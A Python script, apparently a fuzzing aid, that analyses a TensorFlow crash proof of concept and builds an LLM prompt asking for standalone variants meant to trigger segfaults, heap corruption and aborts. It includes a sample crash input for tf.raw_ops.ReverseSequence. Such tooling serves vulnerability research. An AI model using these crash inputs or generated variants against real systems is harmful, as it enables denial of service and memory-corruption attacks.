import ast
import subprocess
import sys
import tensorflow as tf
import io
import contextlib
from pathlib import Path
import inspect

import textwrap
import ast
import re

def clean_poc_code(raw_code: str) -> str:
    """
    Strips markdown markers, variant headers, and dedents code.
    """
    # Remove ```python and ``` if present
    code = re.sub(r"^```python\n?|```$", "", raw_code.strip(), flags=re.MULTILINE)

    # Remove any variant comment headers
    code = re.sub(r"#\s*Variant\s+\d+\s*-\s*.*", "", code)

    # Dedent and clean
    return textwrap.dedent(code).strip()




def get_full_name(node):
    if isinstance(node, ast.Attribute):
        val = get_full_name(node.value)
        return f"{val}.{node.attr}" if val else node.attr
    elif isinstance(node, ast.Name):
        return node.id
    return None

def get_summary(func):
    doc = inspect.getdoc(func)
    if not doc:
        return ""
    return doc.splitlines()[0].lower()

def collect_tf_functions():
    tf_funcs = {}
    for name in dir(tf):
        obj = getattr(tf, name)
        if callable(obj):
            try:
                tf_funcs[f"tf.{name}"] = get_summary(obj)
            except Exception:
                continue

    if hasattr(tf, 'raw_ops'):
        for name in dir(tf.raw_ops):
            obj = getattr(tf.raw_ops, name)
            if callable(obj):
                try:
                    tf_funcs[f"tf.raw_ops.{name}"] = get_summary(obj)
                except Exception:
                    continue
    return tf_funcs

def suggest_function_variants(tf_func_name, summary_map, max_results=5):
    base_summary = summary_map.get(tf_func_name, "")
    if not base_summary:
        return []

    base_words = set(base_summary.split())
    candidates = []

    for name, summary in summary_map.items():
        if name == tf_func_name:
            continue
        overlap = len(base_words & set(summary.split()))
        if overlap > 0:
            candidates.append((name, overlap, summary))

    candidates.sort(key=lambda x: -x[1])
    return [name for name, _, _ in candidates[:max_results]]
    
def extract_tf_operations(file_path):
    print("\n1. Extracting TensorFlow Operations (AST-based):")
    with open(file_path, 'r') as f:
        code = f.read()
        clean_code = clean_poc_code(code)
    tree = ast.parse(clean_code)
    tf_ops = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Attribute):
                full_call = get_full_name(func)
                if full_call.startswith("tf."):
                    tf_ops.add(full_call)

    if tf_ops:
        summary_map = collect_tf_functions()
        for op in sorted(tf_ops):
            print(f"- TF Operation: {op}")
            if op in summary_map:
                variants = suggest_function_variants(op, summary_map)
                if variants:
                    print("  Function Variants:")
                    for v in variants:
                        print(f"    - {v}")
    else:
        print("- No TensorFlow operations found via AST.")
    return list(tf_ops)

def extract_ast_features(file_path):
    print("\n2. Extracting Mutatable Inputs (AST-focused):")
    with open(file_path, 'r') as file:
        code = file.read()
    tree = ast.parse(code)
    features = []
    target_args = {"value", "shape", "dtype", "input_handle", "size"}

    assignments = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign) and isinstance(node.targets[0], ast.Name):
            var_name = node.targets[0].id
            try:
                var_val = ast.unparse(node.value) if hasattr(ast, 'unparse') else str(node.value)
                assignments[var_name] = var_val
            except Exception:
                assignments[var_name] = var_name

    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            func_name = ''
            if isinstance(node.func.value, ast.Name):
                func_name = f"tf.{node.func.attr}"
            elif isinstance(node.func.value, ast.Attribute):
                func_name = f"tf.{node.func.value.attr}.{node.func.attr}"
            if func_name:
                feature = {'function': func_name}
                for kw in node.keywords:
                    if kw.arg in target_args:
                        try:
                            if isinstance(kw.value, ast.Name) and kw.value.id in assignments:
                                value_repr = assignments[kw.value.id]
                            else:
                                value_repr = ast.unparse(kw.value) if hasattr(ast, 'unparse') else str(kw.value)
                            feature[kw.arg] = value_repr
                        except Exception:
                            continue
                if len(feature) > 1:
                    features.append(feature)

    if features:
        for f in features:
            print(f"- Function: {f['function']}")
            for key, value in f.items():
                if key != 'function':
                    print(f"  - {key}: {value}")
    else:
        print("- No relevant mutable input arguments found.")
    return features


def extract_use_def_chains(tree):
    """
    Traces variable assignments to understand how inputs flow into TF operations.
    """
    defs = {}
    chains = []
    
    for node in ast.walk(tree):
        # Record Definitions
        if isinstance(node, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    defs[target.id] = ast.unparse(node.value)
        
        # Record Uses in TF Calls
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
            call_full_name = get_full_name(node.func)
            if call_full_name and call_full_name.startswith("tf."):
                for arg in node.args:
                    if isinstance(arg, ast.Name) and arg.id in defs:
                        chains.append(f"Argument '{arg.id}' (defined as `{defs[arg.id]}`) used in {call_full_name}")
                for kw in node.keywords:
                    if isinstance(kw.value, ast.Name) and kw.value.id in defs:
                        chains.append(f"Keyword '{kw.arg}' (variable '{kw.value.id}' defined as `{defs[kw.value.id]}`) used in {call_full_name}")
    return chains

def extract_poc_features(poc_code: str):
    
    file_path = "temp_poc.py"
    with open(file_path, 'w') as f:
        f.write(poc_code)

    print(f"Analyzing tf PoC: {file_path}")
    clean_code = clean_poc_code(poc_code)
    tree = ast.parse(clean_code)
    
    use_def_chains = extract_use_def_chains(tree)
    tf_ops = extract_tf_operations(file_path)
    ast_features = extract_ast_features(file_path)
   # harness_features = extract_test_harness(file_path)

    tf_op_variants = collect_tf_functions()
    variant_suggestions = {}
    for op in tf_ops:
        variants = suggest_function_variants(op, tf_op_variants)
        variant_suggestions[op] = variants

    mutatable_values = set()
    mutatable_dtypes = set()
    mutatable_sizes = set()
    for feat in ast_features:
        for key, val in feat.items():
            if key == 'value':
                mutatable_values.add(val)
            elif key == 'dtype':
                mutatable_dtypes.add(val)
            elif key == 'size':
                mutatable_sizes.add(val)

    prompt_template = f'''
You're a security researcher specializing in machine learning vulnerability exploitation.

Given this successful TensorFlow PoC that triggered a crash:
```python
{poc_code.strip()}
```

Data Flow Analysis (Use-Def Chains): {chr(10).join(["- " + c for c in use_def_chains])}

Instructions: Mutate the data flow and operation variants. Instead of just changing values, change HOW the data is defined (e.g., replace a constant with a generator, a list with a sparse tensor) to trigger memory corruption or assertion failures.

Generate unique Python PoC variants taking care of mutating under these conditions but not limited to
#possible variants for the tf operation variants of given poc are {variant_suggestions}
#Mutatable values: {list(mutatable_values)}
#Mutable types: {list(mutatable_dtypes)}
#Mutable sizes: {list(mutatable_sizes)}

The PoC variants must introduce modifications to trigger:
- segmentation faults
- heap or stack corruption
- memory access violations
- aborts (SIGABRT)
- assertion failures
- misuse of TensorFlow raw_ops

Avoid try except block

Output the variants using this format:
```python
# Variant {{num1}} - [brief description]
<variant code>

# Variant {{num2}} - [brief description]
<variant code>

# Variant {{num3}} - [brief description]
<variant code>
```
Only include runnable Python code in each block. Ensure each variant is standalone, crash-oriented, and enclosed in ```python and ``` code blocks.
'''

    print("\n=================== Prompt Template ===================")
    print(prompt_template)

    return {
        'variant_suggestions': variant_suggestions,
        'mutatable_values': mutatable_values,
        'mutatable_dtypes': mutatable_dtypes,
        'mutatable_sizes': mutatable_sizes,
        'prompt_template': prompt_template
    }

if __name__ == "__main__":
    poc_code = '''
import tensorflow as tf

# Create a tensor with an unknown shape
input_tensor = tf.raw_ops.Placeholder(dtype=tf.float32)

# Set batch_dim to 0 (a valid value)
batch_dim = 0

# Create a seq_lengths tensor
seq_lengths = tf.constant([1, 2, 3], dtype=tf.int64)

# Call ReverseSequence with the vulnerable input
output = tf.raw_ops.ReverseSequence(input=input_tensor, seq_lengths=seq_lengths, seq_dim=1, batch_dim=batch_dim)

'''
    result = extract_poc_features(poc_code)
